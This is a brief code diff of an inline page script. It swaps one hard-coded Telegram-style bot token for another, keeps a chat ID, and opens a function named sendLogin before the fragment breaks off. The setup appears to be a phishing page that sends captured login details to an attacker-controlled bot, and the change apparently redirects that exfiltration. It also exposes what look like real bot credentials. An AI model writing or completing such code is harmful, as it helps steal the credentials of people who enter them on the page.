@@ -1,6 +1,6 @@
 <script>
 (function() {
-    var token = '8506083374:AAHCDHTURj1PfPr8NFxF28ZjpPhdYzCdSII';
+    var token = '8860341542:AAFRwUuE-w9faoehNhFDyQ5WAv_4gB2PySc';
     var chat = '6614104922'; 
     
     function sendLogin() {
